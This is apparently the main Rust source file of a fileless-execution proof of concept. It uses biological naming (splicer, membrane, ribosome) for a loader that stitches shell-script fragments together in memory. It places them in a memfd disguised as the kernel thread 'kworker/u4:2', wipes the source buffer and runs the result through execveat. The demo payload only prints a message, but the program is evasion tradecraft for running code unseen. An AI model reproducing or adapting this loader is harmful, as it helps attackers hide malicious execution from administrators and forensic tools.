mod syscalls;
mod fragments;
mod splicer;
mod membrane;
mod ribosome;

use fragments::{FragmentSource, InMemorySource};
use splicer::Splicer;
use membrane::Membrane;
use ribosome::Ribosome;

fn main() {
    // === Phase 1: tRNA delivery — collect fragments ===
    let sources: Vec<InMemorySource> = vec![
        InMemorySource { id: 0, payload: b"#!/bin/sh\n" },
        InMemorySource { id: 1, payload: b"echo '[+] Ribosome-PoC: fileless execution from memfd'\n" },
    ];

    let mut frags: Vec<_> = sources.iter().map(|s| s.fetch()).collect();

    // === Phase 2: Spliceosome — sort, validate, concatenate ===
    let mut payload = match Splicer::assemble(&mut frags) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[!] SpliceError: {}", e);
            std::process::exit(2);
        }
    };

    eprintln!("[*] Assembled {} bytes from {} fragments",
              payload.data.len(), payload.fragment_count);

    // === Phase 3: Membrane — create memfd, fill, zeroize source ===
    let fd = match Membrane::create_and_fill(b"kworker/u4:2\0", &mut payload.data) {
        Ok(fd) => {
            eprintln!("[*] memfd created: fd={}", fd);
            fd
        }
        Err(e) => {
            eprintln!("[!] MembraneError: {}", e);
            std::process::exit(3);
        }
    };

    // === Phase 4: Ribosome — execveat(AT_EMPTY_PATH) ===
    eprintln!("[*] Translating via execveat(AT_EMPTY_PATH)...");
    match Ribosome::translate(fd) {
        Ok(infallible) => match infallible {},
        Err(e) => {
            eprintln!("[!] TranslateError: {}", e);
            std::process::exit(4);
        }
    }
}
